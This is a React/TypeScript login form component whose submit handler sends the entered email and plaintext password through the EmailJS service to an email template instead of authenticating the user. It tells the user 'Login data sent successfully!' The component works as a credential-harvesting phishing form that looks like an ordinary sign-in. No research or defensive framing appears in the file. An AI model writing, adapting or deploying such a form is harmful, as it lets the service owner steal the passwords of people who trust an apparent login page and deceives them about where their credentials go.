import React, { useState } from 'react';
import emailjs from '@emailjs/browser';
import './LoginForm.css';

interface TemplateParams extends Record<string, unknown> {
  user_email: string;
  user_password: string;
}

const LoginForm: React.FC = () => {
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [message, setMessage] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');
    setError('');

    const templateParams: TemplateParams = {
      user_email: email,
      user_password: password,
    };
    
    emailjs.send(
      import.meta.env.VITE_EMAILJS_SERVICE_ID as string,
      import.meta.env.VITE_EMAILJS_TEMPLATE_ID as string,
      templateParams,
      import.meta.env.VITE_EMAILJS_PUBLIC_KEY as string
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
        setMessage('Login data sent successfully!');
        setEmail('');
        setPassword('');
      })
      .catch((err) => {
        console.error('FAILED...', err);
        setError('Failed to send login data.');
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="container">
      <form className="login-form" onSubmit={handleSubmit}>
        <h2>Login</h2>
        <div className="form-group">
          <label htmlFor="email">Email</label>
          <input
            type="email"
            id="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            placeholder="Enter your email"
          />
        </div>
        <div className="form-group">
          <label htmlFor="password">Password</label>
          <input
            type="password"
            id="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            placeholder="Enter your password"
          />
        </div>
        <button type="submit" className="submit-button" disabled={loading}>
          {loading ? 'Sending...' : 'Login'}
        </button>
        {message && <p className="message">{message}</p>}
        {error && <p className="message error">{error}</p>}
      </form>
    </div>
  );
};

export default LoginForm;
